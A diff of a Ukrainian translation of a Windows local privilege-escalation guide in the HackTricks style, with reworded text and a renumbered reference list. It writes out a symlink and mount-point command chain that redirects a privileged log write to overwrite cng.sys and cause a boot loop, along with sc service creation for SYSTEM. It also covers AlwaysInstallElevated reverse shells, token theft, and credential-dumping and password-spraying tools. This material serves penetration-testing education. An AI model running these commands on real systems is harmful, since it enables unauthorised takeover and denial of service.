-- **Fallback відсутній**, як і **можливість відновлення** без зовнішнього втручання (наприклад, boot repair або доступу до диска).
+- Він бачить папку, **не може визначити справжній driver** і **припиняє роботу або зупиняє boot**.
+- **Fallback відсутній**, як і **відновлення** без зовнішнього втручання (наприклад, boot repair або доступу до диска).
 
 ### Від привілейованих шляхів журналів/резервних копій + OM symlinks до довільного перезапису файлів / boot DoS
 
-Коли **привілейований service** записує logs/exports у шлях, отриманий із **доступного для запису config**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).
+Коли **привілейований service** записує журнали/експорти за шляхом, отриманим із **доступної для запису config**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>
 
-**Requirements**
-- Config, що зберігає цільовий шлях, доступний attacker для запису (наприклад, `%ProgramData%\...\.ini`).
-- Можливість створити mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
-- Привілейована операція, яка записує в цей шлях (log, export, report).
+**Вимоги**
+- Config, у якому зберігається цільовий шлях, доступна attacker для запису (наприклад, `%ProgramData%\...\.ini`).
+- Можливість створити mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
+- Привілейована операція, яка записує за цим шляхом (log, export, report).
 
-**Example chain**
-1. Прочитайте config, щоб отримати місце призначення привілейованого log, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
-2. Перенаправте шлях без admin:
+**Приклад ланцюжка**
+1. Прочитайте config, щоб отримати призначення привілейованого log, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
+2. Перенаправте шлях без прав адміністратора:
 ```cmd
 mkdir C:\users\iconics_user\AppData\Local\Temp\logs
 CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
 CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
 ```
-3. Дочекайтеся, поки привілейований компонент запише log (наприклад, адміністратор ініціює "надсилання тестового SMS"). Тепер запис потрапляє до `C:\Windows\System32\cng.sys`.
-4. Перевірте перезаписану ціль (за допомогою hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити змінений шлях до driver → **boot loop DoS**. Це також узагальнюється на будь-який захищений файл, який привілейований service відкриватиме для запису.
+3. Дочекайтеся, поки привілейований компонент запише лог (наприклад, адміністратор ініціює "send test SMS"). Тепер запис потрапляє до `C:\Windows\System32\cng.sys`.
+4. Перевірте перезаписану ціль (hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити шлях до підробленого драйвера → **boot loop DoS**. Це також узагальнюється на будь-який захищений файл, який привілейований сервіс відкриває для запису.
 
-> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія існує в `C:\Windows\System32\cng.sys`, спочатку може бути здійснена спроба завантажити саме її, що робить цей файл надійною DoS-ціллю для пошкоджених даних.
+> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія існує в `C:\Windows\System32\cng.sys`, спочатку може бути здійснена спроба завантажити її, що робить цей файл надійною ціллю для DoS із пошкодженими даними.
 
 
 
 ## **Від High Integrity до System**
 
-### **Новий service**
+### **Новий сервіс**
 
-Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити та запустити новий service**:
+Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити та запустити новий сервіс**:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
 > [!TIP]
-> Під час створення service binary переконайтеся, що це valid service або що binary виконує необхідні дії достатньо швидко, оскільки його буде вбито через 20 с, якщо це не valid service.
+> Під час створення бінарного файлу service переконайтеся, що це дійсний service або що бінарний файл достатньо швидко виконує необхідні дії, оскільки його буде завершено через 20 с, якщо це недійсний service.
 
 ### AlwaysInstallElevated
 
-Із процесу з High Integrity можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** та **встановити** reverse shell за допомогою _**.msi**_-обгортки.\
-[Більше інформації про відповідні ключі реєстру та встановлення пакета _.msi_ наведено тут.](#alwaysinstallelevated)
+Із процесу з High Integrity можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
+[Більше інформації про задіяні ключі реєстру та встановлення пакета _.msi_ тут.](#alwaysinstallelevated)
 
 ### High + SeImpersonate privilege to System
 
@@ -1854,19 +1858,19 @@ sc start newservicename
 
 ### From SeDebug + SeImpersonate to Full Token privileges
 
-Якщо у вас є ці token privileges (імовірно, ви знайдете їх у вже наявному процесі з High Integrity), ви зможете **відкрити майже будь-який процес** (за винятком protected processes) із привілеєм SeDebug, **скопіювати token** процесу та створити **довільний процес із цим token**.\
-Зазвичай для цієї техніки **обирають будь-який процес, запущений від імені SYSTEM з усіма token privileges** (_так, можна знайти процеси SYSTEM без усіх token privileges_).\
+Якщо ви маєте ці token privileges (імовірно, ви знайдете їх у вже наявному процесі з High Integrity), ви зможете **відкрити майже будь-який process** (крім protected processes) із privilege SeDebug, **скопіювати token** process і створити **довільний process із цим token**.\
+За допомогою цієї техніки зазвичай **обирають будь-який process, запущений від імені SYSTEM, з усіма token privileges** (_так, можна знайти processes SYSTEM без усіх token privileges_).\
 **Приклад коду, що виконує запропоновану техніку, можна** [**знайти тут**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-Ця техніка використовується meterpreter для підвищення привілеїв у `getsystem`. Техніка полягає у **створенні pipe, а потім створенні або використанні service для запису в цей pipe**. Після цього **server**, який створив pipe за допомогою привілею **`SeImpersonate`**, зможе **імперсонувати token** клієнта pipe (service), отримавши привілеї SYSTEM.\
+Ця техніка використовується meterpreter для ескалації в `getsystem`. Техніка полягає у **створенні pipe, а потім створенні або зловживанні service для запису в цей pipe**. Після цього **server**, який створив pipe за допомогою privilege **`SeImpersonate`**, зможе **імперсонувати token** клієнта pipe (service), отримавши privileges SYSTEM.\
 Якщо ви хочете [**дізнатися більше про name pipes, прочитайте це**](#named-pipe-client-impersonation).\
 Якщо ви хочете переглянути приклад [**переходу від high integrity до System за допомогою name pipes, прочитайте це**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-Якщо вам вдасться **виконати hijack dll**, яку **завантажує** **процес**, запущений від імені **SYSTEM**, ви зможете виконати довільний код із цими дозволами. Тому Dll Hijacking також корисний для такого типу підвищення привілеїв і, крім того, його набагато **легше виконати з процесу з high integrity**, оскільки він матиме **дозволи на запис** у папки, що використовуються для завантаження dll.\
+Якщо вам вдасться **перехопити dll**, який **завантажується** **process**, запущеним від імені **SYSTEM**, ви зможете виконати довільний код із цими permissions. Тому Dll Hijacking також корисний для такого типу privilege escalation і, крім того, його **набагато легше виконати з process із high integrity**, оскільки він матиме **write permissions** на папки, що використовуються для завантаження dll.\
 **Ви можете** [**дізнатися більше про Dll hijacking тут**](dll-hijacking/index.html)**.**
 
 ### **From Administrator or Network Service to System**
@@ -1877,7 +1881,7 @@ sc start newservicename
 
 ### From LOCAL SERVICE or NETWORK SERVICE to full privs
 
-**Прочитайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
+**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
 ## More help
 
@@ -1885,84 +1889,84 @@ sc start newservicename
 
 ## Useful tools
 
-**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Найкращий інструмент для пошуку векторів локальної privilege escalation у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє неправильні конфігурації та чутливі файли (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє деякі можливі неправильні конфігурації та збирає інформацію (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
-[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє неправильні конфігурації**\
-[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію сесій PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Локально використовуйте -Thorough.**\
-[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявлено.**\
-[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпилює зібрані паролі по домену**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для підміни ADIDNS/LLMNR/mDNS і man-in-the-middle.**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове Windows-перерахування для privesc**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (ЗАСТАРІЛИЙ порівняно з Watson)\
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє неправильні налаштування та sensitive files (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє деякі можливі неправильні налаштування та збирає інформацію (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
+[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє неправильні налаштування**\
+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сесії PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Локально використовуйте -Thorough.**\
+[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує credentials із Credential Manager. Виявлено.**\
+[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Виконує password spray зібраними passwords у домені**\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це PowerShell ADIDNS/LLMNR/mDNS spoofer та man-in-the-middle tool.**\
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове Windows enumeration для privesc**\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Шукає відомі vulnerabilities для privesc (DEPRECATED для Watson)\
 [~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права Admin)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібна компіляція за допомогою VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує host у пошуках неправильних конфігурацій (це радше інструмент збору інформації, ніж privesc) (потрібна компіляція) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з великої кількості software (precompiled exe у github)**\
-[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевіряє неправильні конфігурації (precompiled executable у github). Не рекомендовано. Погано працює у Win10.\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевіряє можливі неправильні конфігурації (exe з python). Не рекомендовано. Погано працює у Win10.
+[**Watson**](https://github.com/rasta-mouse/Watson) -- Шукає відомі vulnerabilities для privesc (потрібна компіляція за допомогою VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перевіряє host на наявність неправильних налаштувань (більше tool для збору інформації, ніж для privesc) (потрібна компіляція) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує credentials із багатьох software (precompiled exe у github)**\
+[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp на C#**\
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевіряє неправильні налаштування (precompiled executable у github). Не рекомендовано. Погано працює у Win10.\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевіряє можливі неправильні налаштування (exe із python). Не рекомендовано. Погано працює у Win10.
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цього допису (для коректної роботи йому не потрібен accesschk, але він може його використовувати).
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, створений на основі цього допису (для коректної роботи йому не потрібен accesschk, але він може його використовувати).
 
 **Local**
 
-[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** і рекомендує робочі exploits (local python)\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** і рекомендує робочі exploits (local python)
+[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** і рекомендує робочі exploits (локальний python)\
+[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** та рекомендує робочі exploits (локальний python)
 
 **Meterpreter**
 
 _multi/recon/local_exploit_suggestor_
 
-Потрібно скомпілювати project, використовуючи правильну версію .NET ([див. тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену версію .NET на victim host, можна виконати:
+Потрібно скомпілювати project, використовуючи правильну версію .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену версію .NET на host жертви, можна виконати:
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
 ```
 ## Посилання
 
-- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
-- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
-- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
-- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
-- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
-- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
-- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
-- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
-- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
-- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
-- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
-
-- [0xdf – HTB/VulnLab JobTwo: фішинг через макрос Word VBA по SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
-- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
-
-- [Check Point Research – Переслідування Silver Fox: гра в кішки-мишки в тінях kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
-- [Unit 42 – Уразливість привілейованої файлової системи в SCADA-системі](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
-- [Інструменти тестування Symbolic Link – використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
-- [Посилання в минуле. Зловживання Symbolic Links у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
-- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
-- [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
-- [ZDI – Падіння довіри до Node.js: небезпечне розв'язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
-- [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
-- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
-- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
-- [Trail of Bits – завдання C/C++ checklist із розв'язаннями](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
-- [Microsoft Learn – функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
-- [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
-- [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
-- [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
-- [Pwn2Own із Microslop: ланцюжок CLDFLT і DirectX Kernel Race Conditions для Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
-- [Один I/O Ring, щоб підкорити їх усі: повна exploit-примітива Read/Write у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
+- [1] [Основи Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
+- [2] [Підвищення привілеїв шляхом експлуатації слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
+- [3] [Windows Privilege Escalation — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
+- [4] [lpeworkshop — Workshop з локального Privilege Escalation у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
+- [5] [DerbyCon 3.0 — Windows Attacks: AT — це новий black (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
+- [6] [Privilege Escalation — Windows — повний посібник OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
+- [7] [Windows — Privilege Escalation — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [8] [Посібник з Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
+- [9] [Чекліст Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
+- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
+- [11] [Методи Windows Privilege Escalation для Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
+- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA за SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
+- [13] [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
+- [14] [Check Point Research — У гонитві за Silver Fox: гра в кішки-мишки в тінях kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
+- [15] [Unit 42 — Уразливість привілейованої файлової системи в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
+- [16] [Інструменти тестування Symbolic Link — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
+- [17] [Повернення в минуле. Зловживання Symbolic Links у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
+- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
+- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
+- [20] [ZDI — Node.js Trust Falls: небезпечне розв'язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
+- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
+- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
+- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
+- [24] [Trail of Bits — завдання чекліста C/C++, розв'язані](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
+- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
+- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
+- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
+- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
+- [29] [Pwn2Own with Microslop: об'єднання CLDFLT і DirectX Kernel Race Conditions для Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
+- [30] [One I/O Ring to Rule Them All: повний exploit primitive читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
+- [31] [Зловживання довільним видаленням файлів для Privilege Escalation та інші корисні трюки](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
+- [32] [thezdi/PoC — код експлойту FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
+- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, 1-day для локального Privilege Escalation у Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
+- [34] [Windows 7: дослідження Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
+- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
 
 {{#include ../../banners/hacktricks-training.md}}
